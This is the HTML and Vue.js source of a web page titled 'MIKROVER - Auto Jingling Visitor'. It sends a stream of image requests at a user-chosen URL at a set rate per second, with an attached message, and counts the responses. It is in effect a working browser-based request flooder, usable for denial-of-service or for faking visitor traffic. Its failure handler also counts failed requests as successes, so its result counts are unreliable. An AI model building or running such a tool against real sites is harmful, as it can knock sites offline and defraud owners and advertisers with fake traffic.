<div id="vueApp">
<div class="container">
<header class="header-section">
<h2>{{ config.name }}</h2>
<span class="text-muted">{{ config.description }}</span>
<div class="row">
<div class="col-md-6">
<div class="card">
<div class="card-body">
<form v-on:submit.prevent="goJinx">
<div class="form-group">
<label class="label-control" for="inputUrl">Input URL with HTTP://</label>
<input class="form-control" id="inputUrl" name="url" required="true" type="text" v-model="target.url"/>
</div>
<div class="row">
<div class="col-md-6">
<div class="form-group">
<label class="label-control" for="inputTraffic">Traffic / sec</label>
<input class="form-control" id="inputTraffic" name="traffic" required="true" type="number" v-model="target.traffic"/>
</div>
</div>
<div class="col-md-6">
<div class="form-group">
<label class="label-control" for="inputMsg">Leave your message:</label>
<input class="form-control" id="inputMsg" name="message" required="true" type="text" v-model="target.msg"/>
</div>
</div>
</div>
<button class="btn btn-raised btn-primary" id="btn-send" type="submit" v-if="status.isState == false">Send Traffic <i class="fas fa-paper-plane"></i></button>
<a class="btn btn-danger" href="javascript:void(0)" id="btn-stop" v-else="" v-on:click="jinxStop">Stop <i class="fas fa-minus-square"></i></a>
</form>
</div>
</div>
</div>
<div class="col-md-6">
<div class="card">
<div class="card-body">
<h3>Result</h3>
<table class="table table-striped table-hover">
<tr>
<td><b class="text-warning">Requested</b></td>
<td>: <b>{{ status.requested }}</b></td>
</tr>
<tr>
<td><b class="text-success">Success</b></td>
<td>: <b>{{ status.success }}</b></td>
</tr>
<tr>
<td><b class="text-danger">Failed</b></td>
<td>: <b>{{ status.failed }}</b></td>
</tr>
</table>
</div>

<script>
//<![CDATA[
var jinxInt;

var vueJingling = new Vue({
  el: "#vueApp",
  data: {
    config: {
      "name": "MIKROVER - Auto Jingling Visitor",
      "description": "From Blogger For Blogger"
    },
    target: {
      "url": "",
      "traffic": 0,
      "msg": ""
    },
    status: {
      "isState": false,
      "requested": 0,
      "success": 0,
      "failed": 0
    },
    reqHash: []
  },
  methods: {
    onReq: function(rid) {
      this.status.requested++
    },
    onComplete: function(rid) {
      delete this.reqHash[rid];
    },
    onFail: function(rid) {
      this.status.success++
      delete this.reqHash[rid];
    },
    onSuccess: function(rid) {
      this.status.success++
      delete this.reqHash[rid];
    },
    goJinx: function() {
      var vm = this;

      this.status.isState = true;
      jinxInt = setInterval(this.httpReq, (10000 / parseInt(this.target.traffic) | 0));
    },
    jinxStop: function() {
      clearInterval(jinxInt);
      this.status.isState = false;
    },
    httpReq: function() {
      var vm = this;

      if (this.status.requested > this.status.success + this.status.failed + 10000) {
        return;
      }

      var rID = Number(new Date());
      var img = new Image();
      img.onerror =  function() {vm.onFail(rID)};
      img.onabort = function() {vm.onFail(rID)};
      img.onload = function() {vm.onSuccess(rID)};

      img.setAttribute("src", this.target.url + "?id=" + rID + ";msg=" + this.target.msg);
      this.reqHash[rID] = img;
      this.onReq(rID);
    }
  },
  mounted: function() {
    
  }
});
//]]>
</script>
